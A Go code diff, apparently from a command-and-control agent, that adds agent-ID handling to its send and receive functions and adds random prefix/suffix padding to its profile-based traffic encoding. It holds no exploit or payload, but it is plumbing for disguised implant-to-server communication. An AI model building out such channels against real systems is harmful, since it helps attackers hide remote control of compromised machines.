@@ -2,6 +2,7 @@ package main
 
 import (
 	"common/profiles"
+	"common/slices"
 	"encoding/base64"
 	"encoding/hex"
 	"errors"
@@ -14,16 +15,21 @@ var (
 	ErrUnknownOp = errors.New("unknown operation")
 )
 
-func send(profile *profiles.Profile, data *string) (err error) {
+func send(agentId *string, profile *profiles.Profile, data *string) (err error) {
 	body := []byte(*data)
-	reqBody, err := processBody(&profile.Outcall, &body)
+	reqBody, err := operateData(&profile.Outcall.Payload.Operations, &body)
+	if err != nil {
+		return err
+	}
+	agentIdStr := []byte(*agentId)
+	processedAgentId, err := operateData(&profile.Outcall.ID.Operations, &agentIdStr)
 	if err != nil {
 		return err
 	}
 
 	client := profile.GetHttpClient()
 
-	req, err := profile.GetRequestOutcall([]byte(reqBody))
+	req, err := profile.GetRequestOutcall(&processedAgentId, []byte(reqBody))
 	if err != nil {
 		return err
 	}
@@ -41,10 +47,16 @@ func send(profile *profiles.Profile, data *string) (err error) {
 	return nil
 }
 
-func receive(profile *profiles.Profile) (instruction string, err error) {
+func receive(agentId *string, profile *profiles.Profile) (instruction string, err error) {
+	agentIdStr := []byte(*agentId)
+	processedAgentId, err := operateData(&profile.Outcall.ID.Operations, &agentIdStr)
+	if err != nil {
+		return "", err
+	}
+
 	client := profile.GetHttpClient()
 
-	req, err := profile.GetRequestIncall(nil)
+	req, err := profile.GetRequestIncall(&processedAgentId, nil)
 	if err != nil {
 		return "", err
 	}
@@ -68,17 +80,25 @@ func receive(profile *profiles.Profile) (instruction string, err error) {
 		return "", nil
 	}
 
-	return processBody(&profile.Incall, &body)
+	return operateData(&profile.Incall.Payload.Operations, &body)
 }
 
-func processBody(req *profiles.ProfileRequest, body *[]byte) (data string, err error) {
+func operateData(operations *[]profiles.Operation, body *[]byte) (data string, err error) {
 	data = string(*body)
 
-	for _, operation := range req.Operations {
-		switch operation {
+	for _, operation := range *operations {
+		switch operation.Action {
 
 		default:
 			return data, ErrUnknownOp
+
+		// SET PREFIX
+		case "prefix":
+			data = slices.Rand(&operation.Value) + data
+
+		// SET SUFFIX
+		case "suffix":
+			data = data + slices.Rand(&operation.Value)
 
 		// HEX
 		case "hex_d":
